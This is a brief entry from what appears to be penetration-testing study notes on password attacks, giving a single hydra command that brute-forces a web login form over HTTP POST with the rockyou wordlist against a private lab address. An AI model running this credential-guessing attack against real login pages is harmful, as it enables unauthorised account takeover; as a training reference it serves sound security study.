# 16.Password Attacks — Entry 4

## Categorie

HTTP-FORM

## Commando

```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

## Omschrijving

```
Performing an brute-force attack on a login form (HTTP POST request)
```

## Voorbeeld

_(empty)_

## Opmerkingen

_(empty)_

